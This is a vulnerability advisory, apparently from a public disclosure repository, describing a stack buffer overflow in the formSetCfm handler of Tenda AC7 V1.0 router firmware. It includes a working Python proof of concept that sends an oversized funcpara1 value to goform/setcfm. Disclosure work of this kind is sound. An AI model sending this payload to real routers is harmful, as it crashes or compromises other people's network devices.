## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2776.html

## Affected version

 AC7V1.0 V15.03.06.44

## Vulnerability details

In the Tenda AC7V1.0 V15.03.06.44 has a stack overflow vulnerability located in the `formSetCfm` function. This function accepts the `funcpara1` parameter from a POST request and passes it to the `save_list_data` function. Within `save_list_data`, the array `mib_name` is fixed at 64 bytes. However, since the user has control over the input of `funcpara1`, the statement `sprintf(mib_name, "%s.list%d", list_name, counta);` leads to a buffer overflow. The user-supplied `funcpara1` can exceed the capacity of the `mib_name` array, thus triggering this security vulnerability.

![image-20240318160040332](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318160040332.png)

![image-20240318160103975](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318160103975.png)

![image-20240318160147969](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318160147969.png)

## POC

```python
import requests as re

s = re.Session()
url_base = 'http://192.168.84.101/'

# Send payload
url = url_base + 'goform/setcfm'
data = {
        'funcname': 'save_list_data', 
        'funcpara1': b'a'*0x500, 
        'funcpara2':'aaaaaa'
}

res = re.post(url, data=data)
```

![image-20240318160321131](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318160321131.png)
